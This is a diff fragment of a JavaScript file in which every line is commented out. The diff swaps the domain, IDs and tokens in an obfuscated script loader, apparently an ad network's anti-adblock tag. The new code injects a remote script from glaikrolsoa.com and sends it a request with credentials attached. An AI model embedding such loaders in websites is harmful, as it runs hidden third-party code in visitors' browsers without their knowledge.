@@ -200,29 +200,29 @@
 //             for ($._h = $.BD; $._h < $.Cg; $._h += $.x) {
 //               switch ($._h) {
 //                 case $.CC:
-//                   (t.e = 7455719),
-//                     (t.a = 7455718),
-//                     (t.v = 0),
-//                     (t.w = 0),
-//                     (t.h = 30),
+//                   (t.e = 7472246),
+//                     (t.a = 7472245),
+//                     (t.v = 360),
+//                     (t.w = 1),
+//                     (t.h = 10),
 //                     (t.y = 3),
 //                     (t._ = true),
 //                     (t.g = g[$.ar](
 //                       b("eyJhZGJsb2NrIjp7fSwiZXhjbHVkZXMiOiIifQ==")
 //                     )),
-//                     (t.O = 2),
-//                     (t.k = "Ly9wdW5vb2NrZS5jb20vNDAwLzc0NTU3MTk="),
-//                     (t.S = "cHVub29ja2UuY29t"),
+//                     (t.O = 1),
+//                     (t.k = "Ly9nbGFpa3JvbHNvYS5jb20vNS83NDcyMjQ2"),
+//                     (t.S = "Z2xhaWtyb2xzb2EuY29t"),
 //                     (t.A = 2),
-//                     (t.P = $.JA * 1715199868),
+//                     (t.P = $.JA * 1715514686),
 //                     (t.M = "Zez$#t^*EFng"),
-//                     (t.T = "jr1"),
-//                     (t.B = "mt2zcpuwgsy"),
-//                     (t.N = "kcyh52km"),
-//                     (t.I = "jca"),
-//                     (t.C = "6ml1m7p4qny"),
-//                     (t.z = "_lvvsov"),
-//                     (t.R = "_iildawaj"),
+//                     (t.T = "111"),
+//                     (t.B = "43202h4wxgt"),
+//                     (t.N = "v1wjaqxk"),
+//                     (t.I = "u3f"),
+//                     (t.C = "6njxty22f6d"),
+//                     (t.z = "_fzgmvx"),
+//                     (t.R = "_pgewsrwc"),
 //                     (t.D = false);
 //                   break;
 //                 case $.x:
@@ -5198,16 +5198,26 @@
 //     }
 //     return _;
 //   })(document)
-// )(function (d, z, s, c) {
-//   s.src = "//" + d + "/400/" + z;
-//   s.onerror = s.onload = E;
+// )(function (d, z, x, s, e, o) {
+//   s.src = "//" + d + "/tag.min.js";
+//   x.withCredentials = true;
+//   x.open("GET", "//" + d + "/5/" + z + "/?oo=1&aab=1", !0);
+//   s.onerror = x.onerror = E;
+//   s.onload = x.onload = g;
+//   x.send();
+//   (document.body || document.documentElement).appendChild(s);
+//   function g() {
+//     o = this.response ? JSON.parse(this.response) : o;
+//     o && window.kkp4a5x5tv && window.kkp4a5x5tv(o);
+//   }
 //   function E() {
-//     c && c();
-//     c = null;
+//     e && e();
+//     e = null;
 //   }
-//   try {
-//     (document.body || document.documentElement).appendChild(s);
-//   } catch (e) {
-//     E();
-//   }
-// })("punoocke.com", 7455718, document.createElement("script"), _lvvsov);
+// })(
+//   "glaikrolsoa.com",
+//   7472245,
+//   new XMLHttpRequest(),
+//   document.createElement("script"),
+//   _fzgmvx
+// );
